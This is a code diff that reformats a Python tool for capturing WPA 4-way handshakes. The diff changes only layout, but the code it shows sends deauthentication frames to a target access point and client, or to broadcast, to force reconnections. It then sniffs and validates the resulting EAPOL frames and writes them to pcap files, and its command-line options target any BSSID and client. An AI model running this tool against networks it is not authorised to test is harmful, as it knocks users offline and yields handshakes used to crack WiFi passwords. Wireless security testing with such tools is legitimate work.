@@ -22,14 +22,18 @@ from utils import check_monitor_mode, require_root, setup_logging, validate_inte
 
 
 class HandshakeCapture:
-    def __init__(self, interface: str, target_bssid: str,
-                 target_client: Optional[str] = None,
-                 channel: Optional[int] = None,
-                 output_dir: str = "captures",
-                 timeout: int = 120,
-                 deauth_count: int = 5,
-                 deauth_interval: float = 2.0,
-                 no_deauth: bool = False) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        target_client: Optional[str] = None,
+        channel: Optional[int] = None,
+        output_dir: str = "captures",
+        timeout: int = 120,
+        deauth_count: int = 5,
+        deauth_interval: float = 2.0,
+        no_deauth: bool = False,
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid.upper()
         self.target_client: Optional[str] = target_client.upper() if target_client else None
@@ -56,10 +60,7 @@ class HandshakeCapture:
                 return
 
             dot11 = packet[Dot11]
-            addrs = {
-                str(getattr(dot11, f"addr{i}", "") or "").upper()
-                for i in range(1, 4)
-            }
+            addrs = {str(getattr(dot11, f"addr{i}", "") or "").upper() for i in range(1, 4)}
 
             if self.target_bssid not in addrs:
                 return
@@ -72,9 +73,7 @@ class HandshakeCapture:
             frame_num = len(self.eapol_frames)
             src = str(dot11.addr2 or "").upper()
             dst = str(dot11.addr1 or "").upper()
-            self.logger.info(
-                "EAPOL frame %d captured: %s -> %s", frame_num, src, dst
-            )
+            self.logger.info("EAPOL frame %d captured: %s -> %s", frame_num, src, dst)
 
             if frame_num >= 4:
                 self.handshake_complete = True
@@ -88,7 +87,10 @@ class HandshakeCapture:
         client = self.target_client or "ff:ff:ff:ff:ff:ff"
         self.logger.info(
             "Sending deauth frames: %s -> %s (count: %d, interval: %.1fs)",
-            self.target_bssid, client, self.deauth_count, self.deauth_interval,
+            self.target_bssid,
+            client,
+            self.deauth_count,
+            self.deauth_interval,
         )
 
         while not self._stop_event.is_set():
@@ -96,9 +98,7 @@ class HandshakeCapture:
                 dot11_to_client = Dot11(
                     addr1=client, addr2=self.target_bssid, addr3=self.target_bssid
                 )
-                dot11_to_ap = Dot11(
-                    addr1=self.target_bssid, addr2=client, addr3=self.target_bssid
-                )
+                dot11_to_ap = Dot11(addr1=self.target_bssid, addr2=client, addr3=self.target_bssid)
                 deauth = Dot11Deauth(reason=7)
 
                 frame1 = RadioTap() / dot11_to_client / deauth
@@ -120,7 +120,9 @@ class HandshakeCapture:
             if validate_interface(self.interface):
                 subprocess.run(
                     ["iwconfig", self.interface, "channel", str(channel)],
-                    capture_output=True, text=True, timeout=5,
+                    capture_output=True,
+                    text=True,
+                    timeout=5,
                 )
                 self.logger.info("Set channel to %d", channel)
         except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
@@ -375,12 +377,7 @@ class HandshakeCapture:
 
         params = self._extract_handshake_params(classified)
 
-        valid = (
-            has_complete_handshake
-            and nonce_consistent
-            and replay_counter_valid
-            and mic_present
-        )
+        valid = has_complete_handshake and nonce_consistent and replay_counter_valid and mic_present
 
         result = {
             "valid": valid,
@@ -429,31 +426,41 @@ Note: Interface must be in monitor mode.
         """,
     )
 
-    parser.add_argument("-i", "--interface",
-                        help="Wireless interface in monitor mode")
-    parser.add_argument("-b", "--bssid",
-                        help="Target AP BSSID (MAC address)")
-    parser.add_argument("-c", "--client",
-                        help="Target client MAC (default: any)")
-    parser.add_argument("-ch", "--channel", type=int,
-                        help="Channel to listen on")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory for pcap files (default: captures)")
-    parser.add_argument("-t", "--timeout", type=int, default=120,
-                        help="Capture timeout in seconds (default: 120)")
-    parser.add_argument("--deauth-count", type=int, default=5,
-                        help="Deauth frames per burst (default: 5)")
-    parser.add_argument("--deauth-interval", type=float, default=2.0,
-                        help="Seconds between deauth bursts (default: 2.0)")
-    parser.add_argument("--no-deauth", action="store_true",
-                        help="Passive capture only (no deauth)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
-    parser.add_argument("--verify", metavar="PCAP_FILE",
-                        help="Path to a .pcap file to verify (standalone verification "
-                             "mode; no capture is performed)")
-    parser.add_argument("--verify-captured", action="store_true",
-                        help="Verify the 4-way handshake after capture completes")
+    parser.add_argument("-i", "--interface", help="Wireless interface in monitor mode")
+    parser.add_argument("-b", "--bssid", help="Target AP BSSID (MAC address)")
+    parser.add_argument("-c", "--client", help="Target client MAC (default: any)")
+    parser.add_argument("-ch", "--channel", type=int, help="Channel to listen on")
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Output directory for pcap files (default: captures)",
+    )
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=120, help="Capture timeout in seconds (default: 120)"
+    )
+    parser.add_argument(
+        "--deauth-count", type=int, default=5, help="Deauth frames per burst (default: 5)"
+    )
+    parser.add_argument(
+        "--deauth-interval",
+        type=float,
+        default=2.0,
+        help="Seconds between deauth bursts (default: 2.0)",
+    )
+    parser.add_argument("--no-deauth", action="store_true", help="Passive capture only (no deauth)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
+    parser.add_argument(
+        "--verify",
+        metavar="PCAP_FILE",
+        help="Path to a .pcap file to verify (standalone verification "
+        "mode; no capture is performed)",
+    )
+    parser.add_argument(
+        "--verify-captured",
+        action="store_true",
+        help="Verify the 4-way handshake after capture completes",
+    )
 
     args = parser.parse_args()
 
@@ -470,9 +477,11 @@ Note: Interface must be in monitor mode.
         print(f"\nHandshake verification for: {args.verify}")
         print(f"  Valid handshake:      {result['valid']}")
         print(f"  Complete (4 msgs):    {result['has_complete_handshake']}")
-        print(f"  Msg1/2/3/4 counts:    "
-              f"{result['msg1_count']}/{result['msg2_count']}/"
-              f"{result['msg3_count']}/{result['msg4_count']}")
+        print(
+            f"  Msg1/2/3/4 counts:    "
+            f"{result['msg1_count']}/{result['msg2_count']}/"
+            f"{result['msg3_count']}/{result['msg4_count']}"
+        )
         print(f"  Nonce consistent:     {result['nonce_consistent']}")
         print(f"  Replay counters OK:   {result['replay_counter_valid']}")
         print(f"  MIC present:          {result['mic_present']}")
